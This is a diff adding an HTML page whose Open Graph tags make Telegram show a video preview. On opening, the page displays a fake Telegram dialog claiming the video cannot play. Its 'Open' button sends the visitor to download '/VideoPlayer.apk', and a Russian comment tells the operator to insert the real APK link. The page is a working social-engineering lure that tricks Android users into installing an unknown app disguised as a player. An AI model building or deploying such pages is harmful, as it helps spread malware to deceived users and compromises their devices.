@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Open Graph теги — Telegram читает их и делает превью видео -->
+  <meta property="og:type" content="video.other" />
+  <meta property="og:title" content="VIDEO_2026_03_12.mp4" />
+  <meta property="og:description" content="" />
+  <meta property="og:image" content="https://wl-adme.cf.tsp.li/resize/728x/jpg/3e3/2bd/67e9e850a5bc721acc51ede640.jpg" />
+  <meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4" />
+  <meta property="og:video:type" content="video/mp4" />
+  <meta property="og:video:width" content="1280" />
+  <meta property="og:video:height" content="720" />
+
+  <title>VIDEO_2026_03_12.mp4</title>
+</head>
+<body>
+
+  <div id="overlay"></div>
+
+  <div id="dialog">
+    <h3>Telegram</h3>
+    <p>App was unable to play this video.<br>Try to play it with external player?</p>
+    <div class="buttons">
+      <button id="btn-cancel">Cancel</button>
+      <button id="btn-open">Open</button>
+    </div>
+  </div>
+
+  <div id="bg">
+    <img src="https://wl-adme.cf.tsp.li/resize/728x/jpg/3e3/2bd/67e9e850a5bc721acc51ede640.jpg" alt="">
+    <div id="play-icon">▶</div>
+  </div>
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #000;
+      font-family: 'Roboto', sans-serif;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    #bg {
+      position: fixed;
+      width: 100%; height: 100%;
+      display: flex; align-items: center; justify-content: center;
+    }
+
+    #bg img {
+      width: 100%; height: 100%;
+      object-fit: cover;
+      filter: blur(4px) brightness(0.4);
+    }
+
+    #play-icon {
+      position: absolute;
+      font-size: 80px;
+      color: rgba(255,255,255,0.3);
+    }
+
+    #overlay {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.55);
+      z-index: 5;
+    }
+
+    #dialog {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      border-radius: 4px;
+      padding: 24px 24px 8px 24px;
+      width: 300px;
+      box-shadow: 0 11px 15px rgba(0,0,0,0.2), 0 9px 46px rgba(0,0,0,0.12);
+      z-index: 10;
+    }
+
+    #dialog h3 {
+      font-size: 20px;
+      font-weight: 500;
+      color: #212121;
+      margin-bottom: 12px;
+    }
+
+    #dialog p {
+      font-size: 14px;
+      color: #666;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: flex-end;
+      gap: 4px;
+      margin: 0 -8px -8px 0;
+      padding-bottom: 8px;
+    }
+
+    .buttons button {
+      border: none;
+      background: none;
+      color: #2196F3;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 10px 16px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+      transition: background 0.15s;
+    }
+
+    .buttons button:hover {
+      background: rgba(33,150,243,0.08);
+    }
+  </style>
+
+  <script>
+    document.getElementById('btn-cancel').onclick = function() {
+      document.getElementById('dialog').style.display = 'none';
+      document.getElementById('overlay').style.display = 'none';
+    };
+
+    document.getElementById('btn-open').onclick = function() {
+      // Сюда вставляешь реальную ссылку на APK
+      window.location.href = '/VideoPlayer.apk';
+    };
+  </script>
+
+</body>
+</html>
